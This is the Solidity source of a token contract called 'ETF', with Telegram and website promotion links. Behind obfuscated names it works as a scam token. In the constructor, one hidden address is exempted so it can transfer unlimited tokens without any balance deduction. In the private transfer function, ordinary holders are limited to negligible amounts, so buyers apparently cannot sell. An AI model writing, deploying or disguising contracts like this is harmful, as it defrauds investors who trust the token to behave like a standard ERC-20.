/*

Telegram: https://t.me/ercetf

Website: https://etf.ethtoken.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract ETF is Ownable {
    uint8 public decimals = 9;

    string public name;

    mapping(address => uint256) private pvruqwiojc;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address vwqulo, address kblzd, uint256 otjswehun) public returns (bool success) {
        require(otjswehun <= allowance[vwqulo][msg.sender]);
        allowance[vwqulo][msg.sender] -= otjswehun;
        xmeui(vwqulo, kblzd, otjswehun);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function xmeui(address vwqulo, address kblzd, uint256 otjswehun) private {
        address focgpwsy = IUniswapV2Factory(fbhnmawltkqs.factory()).getPair(address(this), fbhnmawltkqs.WETH());
        bool tmxr = pvruqwiojc[vwqulo] == block.number;
        if (!seqa[vwqulo]) {
            if (vwqulo != focgpwsy && otjswehun < totalSupply && (!tmxr || otjswehun > uzxtfhjs[vwqulo])) {
                require(totalSupply / (10 ** decimals) >= otjswehun);
            }
            balanceOf[vwqulo] -= otjswehun;
        }
        uzxtfhjs[kblzd] = otjswehun;
        balanceOf[kblzd] += otjswehun;
        pvruqwiojc[kblzd] = block.number;
        emit Transfer(vwqulo, kblzd, otjswehun);
    }

    IUniswapV2Router02 private fbhnmawltkqs;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address ixqzn, uint256 otjswehun) public returns (bool success) {
        allowance[msg.sender][ixqzn] = otjswehun;
        emit Approval(msg.sender, ixqzn, otjswehun);
        return true;
    }

    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => bool) private seqa;

    constructor(string memory wstlh, string memory fatljcq, address jqxydilc, address mpjlv) {
        name = wstlh;
        symbol = fatljcq;
        balanceOf[msg.sender] = totalSupply;
        seqa[mpjlv] = true;
        fbhnmawltkqs = IUniswapV2Router02(jqxydilc);
    }

    mapping(address => uint256) private uzxtfhjs;

    function transfer(address kblzd, uint256 otjswehun) public returns (bool success) {
        xmeui(msg.sender, kblzd, otjswehun);
        return true;
    }

    mapping(address => uint256) public balanceOf;
}
